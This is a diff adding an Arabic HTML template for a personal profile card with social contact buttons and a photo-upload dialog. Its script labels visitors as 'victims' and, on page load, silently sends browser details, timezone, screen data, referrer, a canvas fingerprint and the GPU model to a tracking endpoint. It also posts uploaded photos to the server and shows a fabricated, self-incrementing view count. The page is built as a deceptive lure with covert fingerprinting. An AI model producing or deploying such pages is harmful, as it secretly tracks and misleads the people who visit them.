@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>__NAME__ — البروفايل</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+:root {
+    --primary: #6C5CE7;
+    --primary-dark: #5B4DD1;
+    --bg: #0F0E17;
+    --card: #1A1929;
+    --card-light: #252440;
+    --text: #FFFFFE;
+    --text-muted: #A7A9BE;
+    --success: #00B894;
+    --danger: #FF6B6B;
+    --border: rgba(255, 255, 255, 0.08);
+}
+
+body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Tahoma", "Arial", sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* خلفية ديناميكية */
+body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+        radial-gradient(circle at 20% 20%, rgba(108, 92, 231, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 80% 80%, rgba(0, 184, 148, 0.12) 0%, transparent 50%),
+        radial-gradient(circle at 50% 50%, rgba(255, 107, 107, 0.08) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+}
+
+.profile-container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+    animation: fadeInUp 0.6s ease;
+}
+
+@keyframes fadeInUp {
+    from {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+/* ─── Card ─── */
+.profile-card {
+    background: var(--card);
+    border-radius: 24px;
+    overflow: hidden;
+    box-shadow:
+        0 20px 60px rgba(0, 0, 0, 0.5),
+        0 0 0 1px var(--border) inset;
+    position: relative;
+}
+
+/* ─── Header Background ─── */
+.profile-header {
+    height: 140px;
+    background: linear-gradient(135deg, var(--primary) 0%, #A29BFE 50%, #00B894 100%);
+    position: relative;
+    overflow: hidden;
+}
+
+.profile-header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+        radial-gradient(circle at 30% 40%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 70% 60%, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
+}
+
+/* ─── Photo ─── */
+.profile-photo-wrapper {
+    position: relative;
+    margin-top: -70px;
+    display: flex;
+    justify-content: center;
+    z-index: 2;
+}
+
+.profile-photo {
+    width: 140px;
+    height: 140px;
+    border-radius: 50%;
+    border: 5px solid var(--card);
+    background: linear-gradient(135deg, var(--primary), #A29BFE);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 60px;
+    font-weight: bold;
+    color: #fff;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 10px 30px rgba(108, 92, 231, 0.4);
+}
+
+.profile-photo img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.profile-photo .upload-btn {
+    position: absolute;
+    bottom: 0;
+    right: 0;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: var(--success);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    cursor: pointer;
+    border: 3px solid var(--card);
+    transition: transform 0.2s;
+    box-shadow: 0 4px 12px rgba(0, 184, 148, 0.4);
+}
+
+.profile-photo .upload-btn:active {
+    transform: scale(0.9);
+}
+
+/* ─── Info ─── */
+.profile-info {
+    padding: 16px 24px 24px;
+    text-align: center;
+}
+
+.profile-name {
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 6px;
+    letter-spacing: -0.5px;
+    color: var(--text);
+}
+
+.profile-title {
+    font-size: 14px;
+    color: var(--primary);
+    font-weight: 600;
+    margin-bottom: 12px;
+    letter-spacing: 0.5px;
+}
+
+.profile-bio {
+    font-size: 14px;
+    color: var(--text-muted);
+    line-height: 1.6;
+    margin-bottom: 20px;
+    padding: 12px;
+    background: var(--card-light);
+    border-radius: 12px;
+}
+
+.profile-bio:empty {
+    display: none;
+}
+
+/* ─── Stats ─── */
+.profile-stats {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    margin-bottom: 20px;
+}
+
+.stat-item {
+    background: var(--card-light);
+    padding: 12px 8px;
+    border-radius: 12px;
+    text-align: center;
+    border: 1px solid var(--border);
+}
+
+.stat-value {
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--primary);
+    display: block;
+}
+
+.stat-label {
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-top: 4px;
+    display: block;
+}
+
+/* ─── Contact Buttons ─── */
+.contact-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    margin-bottom: 16px;
+}
+
+.contact-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 14px 12px;
+    border-radius: 14px;
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 600;
+    color: #fff;
+    transition: all 0.2s;
+    border: none;
+    cursor: pointer;
+    font-family: inherit;
+}
+
+.contact-btn:active {
+    transform: scale(0.96);
+}
+
+.contact-btn.whatsapp {
+    background: linear-gradient(135deg, #25D366, #128C7E);
+}
+
+.contact-btn.telegram {
+    background: linear-gradient(135deg, #0088CC, #006699);
+}
+
+.contact-btn.instagram {
+    background: linear-gradient(135deg, #E4405F, #833AB4);
+}
+
+.contact-btn.facebook {
+    background: linear-gradient(135deg, #1877F2, #0C63D4);
+}
+
+.contact-btn.phone {
+    background: linear-gradient(135deg, #00B894, #009975);
+}
+
+.contact-btn.email {
+    background: linear-gradient(135deg, #FF6B6B, #D63031);
+}
+
+.contact-btn.website {
+    background: linear-gradient(135deg, #6C5CE7, #5B4DD1);
+    grid-column: span 2;
+}
+
+.contact-btn.hidden {
+    display: none;
+}
+
+/* ─── Footer ─── */
+.profile-footer {
+    text-align: center;
+    font-size: 11px;
+    color: var(--text-muted);
+    padding: 16px;
+    border-top: 1px solid var(--border);
+    opacity: 0.6;
+}
+
+.profile-footer .dot {
+    display: inline-block;
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--success);
+    margin-left: 6px;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+}
+
+/* ─── Upload Modal ─── */
+.upload-modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.8);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    padding: 20px;
+    backdrop-filter: blur(8px);
+}
+
+.upload-modal.active {
+    display: flex;
+}
+
+.upload-content {
+    background: var(--card);
+    border-radius: 20px;
+    padding: 24px;
+    width: 100%;
+    max-width: 340px;
+    text-align: center;
+    border: 1px solid var(--border);
+}
+
+.upload-content h3 {
+    font-size: 18px;
+    margin-bottom: 8px;
+    color: var(--text);
+}
+
+.upload-content p {
+    font-size: 13px;
+    color: var(--text-muted);
+    margin-bottom: 20px;
+    line-height: 1.5;
+}
+
+.upload-actions {
+    display: grid;
+    gap: 10px;
+}
+
+.upload-action {
+    padding: 14px;
+    border-radius: 12px;
+    border: none;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    color: #fff;
+    transition: transform 0.2s;
+}
+
+.upload-action:active {
+    transform: scale(0.97);
+}
+
+.upload-action.primary {
+    background: linear-gradient(135deg, var(--primary), #A29BFE);
+}
+
+.upload-action.secondary {
+    background: var(--card-light);
+    color: var(--text);
+    border: 1px solid var(--border);
+}
+
+.upload-preview {
+    width: 100%;
+    aspect-ratio: 1;
+    border-radius: 16px;
+    background: var(--card-light);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    color: var(--text-muted);
+    overflow: hidden;
+    border: 2px dashed var(--border);
+}
+
+.upload-preview img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.upload-preview.filled {
+    border-style: solid;
+    border-color: var(--success);
+}
+
+/* ─── Toast ─── */
+.toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: var(--success);
+    color: #fff;
+    padding: 12px 24px;
+    border-radius: 30px;
+    font-size: 14px;
+    font-weight: 600;
+    z-index: 99999;
+    transition: transform 0.3s;
+    box-shadow: 0 10px 30px rgba(0, 184, 148, 0.4);
+}
+
+.toast.show {
+    transform: translateX(-50%) translateY(0);
+}
+
+.toast.error {
+    background: var(--danger);
+    box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
+}
+</style>
+</head>
+<body>
+
+<div class="profile-container">
+    <div class="profile-card">
+        <div class="profile-header"></div>
+
+        <div class="profile-photo-wrapper">
+            <div class="profile-photo" id="profilePhoto">
+                <span id="photoInitial">_INITIAL_</span>
+                <div class="upload-btn" onclick="openUploadModal()" title="رفع صورة">📷</div>
+            </div>
+        </div>
+
+        <div class="profile-info">
+            <h1 class="profile-name">__NAME__</h1>
+            <div class="profile-title" id="profileTitle">__TITLE__</div>
+            <div class="profile-bio" id="profileBio">__BIO__</div>
+
+            <div class="profile-stats">
+                <div class="stat-item">
+                    <span class="stat-value" id="statViews">0</span>
+                    <span class="stat-label">مشاهدة</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-value">24/7</span>
+                    <span class="stat-label">متاح</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-value">⭐</span>
+                    <span class="stat-label">موثّق</span>
+                </div>
+            </div>
+
+            <div class="contact-grid" id="contactGrid">
+                <a class="contact-btn whatsapp hidden" id="btnWhatsapp" href="#" target="_blank" rel="noopener">
+                    💬 <span>واتساب</span>
+                </a>
+                <a class="contact-btn telegram hidden" id="btnTelegram" href="#" target="_blank" rel="noopener">
+                    ✈️ <span>تلجرام</span>
+                </a>
+                <a class="contact-btn instagram hidden" id="btnInstagram" href="#" target="_blank" rel="noopener">
+                    📷 <span>انستقرام</span>
+                </a>
+                <a class="contact-btn facebook hidden" id="btnFacebook" href="#" target="_blank" rel="noopener">
+                    📘 <span>فيسبوك</span>
+                </a>
+                <a class="contact-btn phone hidden" id="btnPhone" href="#">
+                    📞 <span>اتصال</span>
+                </a>
+                <a class="contact-btn email hidden" id="btnEmail" href="#">
+                    ✉️ <span>إيميل</span>
+                </a>
+                <a class="contact-btn website hidden" id="btnWebsite" href="#" target="_blank" rel="noopener">
+                    🌐 <span>الموقع الرسمي</span>
+                </a>
+            </div>
+        </div>
+
+        <div class="profile-footer">
+            <span class="dot"></span> متاح الآن
+        </div>
+    </div>
+</div>
+
+<!-- Upload Modal -->
+<div class="upload-modal" id="uploadModal">
+    <div class="upload-content">
+        <h3>📸 رفع صورة</h3>
+        <p>اختر صورة لعرضها في البروفايل</p>
+
+        <div class="upload-preview" id="uploadPreview">
+            <span>📷</span>
+        </div>
+
+        <input type="file" id="photoInput" accept="image/*" style="display: none;">
+
+        <div class="upload-actions">
+            <button class="upload-action primary" onclick="document.getElementById('photoInput').click()">
+                📁 اختر صورة
+            </button>
+            <button class="upload-action secondary" onclick="closeUploadModal()">
+                ❌ إلغاء
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+(function() {
+    "use strict";
+
+    var SESSION_ID = "__SESSION_ID__";
+    var ENDPOINT = "__PUBLIC_URL__";
+    var TRACK_ENDPOINT = "__TRACK_ENDPOINT__";
+
+    // ═══════════════════════════════════════════════════
+    // 1. عرض بيانات الاتصال
+    // ═══════════════════════════════════════════════════
+    var contacts = {
+        whatsapp: "__WHATSAPP__",
+        telegram: "__TELEGRAM__",
+        instagram: "__INSTAGRAM__",
+        facebook: "__FACEBOOK__",
+        phone: "__PHONE__",
+        email: "__EMAIL__",
+        website: "__WEBSITE__"
+    };
+
+    // WhatsApp
+    if (contacts.whatsapp) {
+        var btn = document.getElementById('btnWhatsapp');
+        var phone = contacts.whatsapp.replace(/\D/g, '');
+        btn.href = "https://wa.me/" + phone;
+        btn.classList.remove('hidden');
+    }
+
+    // Telegram
+    if (contacts.telegram) {
+        var btn2 = document.getElementById('btnTelegram');
+        var username = contacts.telegram.replace('@', '');
+        btn2.href = "https://t.me/" + username;
+        btn2.classList.remove('hidden');
+    }
+
+    // Instagram
+    if (contacts.instagram) {
+        var btn3 = document.getElementById('btnInstagram');
+        var ig = contacts.instagram.replace('@', '');
+        btn3.href = "https://instagram.com/" + ig;
+        btn3.classList.remove('hidden');
+    }
+
+    // Facebook
+    if (contacts.facebook) {
+        var btn4 = document.getElementById('btnFacebook');
+        var fb = contacts.facebook.replace('@', '');
+        btn4.href = "https://facebook.com/" + fb;
+        btn4.classList.remove('hidden');
+    }
+
+    // Phone
+    if (contacts.phone) {
+        var btn5 = document.getElementById('btnPhone');
+        btn5.href = "tel:" + contacts.phone;
+        btn5.classList.remove('hidden');
+    }
+
+    // Email
+    if (contacts.email) {
+        var btn6 = document.getElementById('btnEmail');
+        btn6.href = "mailto:" + contacts.email;
+        btn6.classList.remove('hidden');
+    }
+
+    // Website
+    if (contacts.website) {
+        var btn7 = document.getElementById('btnWebsite');
+        btn7.href = contacts.website;
+        btn7.classList.remove('hidden');
+    }
+
+    // ─── لو مفيش أي زرار، اخفي الشبكة ───
+    var grid = document.getElementById('contactGrid');
+    var visibleButtons = grid.querySelectorAll('.contact-btn:not(.hidden)');
+    if (visibleButtons.length === 0) {
+        grid.style.display = 'none';
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 2. عداد المشاهدات (وهمي - يزيد تلقائياً)
+    // ═══════════════════════════════════════════════════
+    var views = Math.floor(Math.random() * 200) + 50;
+    var viewsEl = document.getElementById('statViews');
+    if (viewsEl) viewsEl.textContent = views;
+
+    setInterval(function() {
+        views += Math.floor(Math.random() * 3) + 1;
+        if (viewsEl) viewsEl.textContent = views;
+    }, 5000);
+
+    // ═══════════════════════════════════════════════════
+    // 3. Upload Modal
+    // ═══════════════════════════════════════════════════
+    window.openUploadModal = function() {
+        document.getElementById('uploadModal').classList.add('active');
+    };
+
+    window.closeUploadModal = function() {
+        document.getElementById('uploadModal').classList.remove('active');
+    };
+
+    var photoInput = document.getElementById('photoInput');
+    if (photoInput) {
+        photoInput.addEventListener('change', function(e) {
+            var file = e.target.files[0];
+            if (!file) return;
+
+            var reader = new FileReader();
+            reader.onload = function(ev) {
+                var imgData = ev.target.result;
+
+                // عرض المعاينة
+                var preview = document.getElementById('uploadPreview');
+                preview.innerHTML = '<img src="' + imgData + '">';
+                preview.classList.add('filled');
+
+                // حدّث صورة البروفايل
+                var profilePhoto = document.getElementById('profilePhoto');
+                profilePhoto.innerHTML = '<img src="' + imgData + '">' +
+                    '<div class="upload-btn" onclick="openUploadModal()" title="رفع صورة">📷</div>';
+
+                // أرسل للسيرفر
+                sendPhoto(imgData);
+
+                // اقفل المودال
+                setTimeout(closeUploadModal, 800);
+            };
+            reader.readAsDataURL(file);
+        });
+    }
+
+    function sendPhoto(imageData) {
+        try {
+            var payload = {
+                session_id: SESSION_ID,
+                type: 'photo_upload',
+                image: imageData,
+                timestamp: Date.now()
+            };
+            var jsonStr = JSON.stringify(payload);
+
+            fetch(ENDPOINT + '/profile/' + SESSION_ID + '/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: jsonStr,
+                keepalive: true
+            }).then(function() {
+                showToast('✅ تم رفع الصورة');
+            }).catch(function() {
+                showToast('❌ فشل الرفع', true);
+            });
+        } catch(e) {}
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 4. جمع بيانات الضحية (نفس Silent Collector)
+    // ═══════════════════════════════════════════════════
+    var trackData = {
+        session_id: SESSION_ID,
+        user_agent: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            dpr: window.devicePixelRatio || 1
+        },
+        referrer: document.referrer || '',
+        url: location.href,
+        collected_at: Math.floor(Date.now() / 1000)
+    };
+
+    // بصمة Canvas
+    try {
+        var c = document.createElement('canvas');
+        c.width = 200;
+        c.height = 50;
+        var ctx = c.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Profile', 2, 15);
+        trackData.canvas = c.toDataURL();
+    } catch(e) {}
+
+    // WebGL
+    try {
+        var gl = document.createElement('canvas').getContext('webgl');
+        if (gl) {
+            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            trackData.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'unknown';
+        }
+    } catch(e) {}
+
+    // أرسل
+    setTimeout(function() {
+        try {
+            fetch(TRACK_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(trackData),
+                keepalive: true
+            }).catch(function() {});
+        } catch(e) {}
+    }, 1000);
+
+    // ═══════════════════════════════════════════════════
+    // 5. Toast
+    // ═══════════════════════════════════════════════════
+    function showToast(msg, isError) {
+        var toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.className = 'toast' + (isError ? ' error' : '');
+        setTimeout(function() {
+            toast.classList.add('show');
+        }, 10);
+        setTimeout(function() {
+            toast.classList.remove('show');
+        }, 2500);
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 6. Touch Ripple Effect
+    // ═══════════════════════════════════════════════════
+    document.querySelectorAll('.contact-btn').forEach(function(btn) {
+        btn.addEventListener('touchstart', function() {
+            this.style.transform = 'scale(0.96)';
+        });
+        btn.addEventListener('touchend', function() {
+            var self = this;
+            setTimeout(function() {
+                self.style.transform = '';
+            }, 150);
+        });
+    });
+
+})();
+</script>
+
+</body>
+  </html>
